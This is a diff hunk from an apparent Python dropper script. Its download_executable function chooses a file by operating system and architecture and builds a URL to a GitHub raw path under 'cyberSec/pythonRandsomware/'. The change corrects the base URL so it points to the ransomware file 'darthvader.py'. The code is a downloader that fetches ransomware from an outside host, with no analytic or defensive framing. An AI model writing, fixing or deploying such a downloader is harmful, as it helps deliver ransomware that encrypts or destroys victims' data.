@@ -9,7 +9,7 @@ def get_system_info():
     return system, arch
 
 def download_executable(system, arch):
-    base_url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware/darthvader.py"
+    base_url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware/"
     if system == "Linux":
         if arch == "x86_64":
             url = base_url + "darthvader.py"
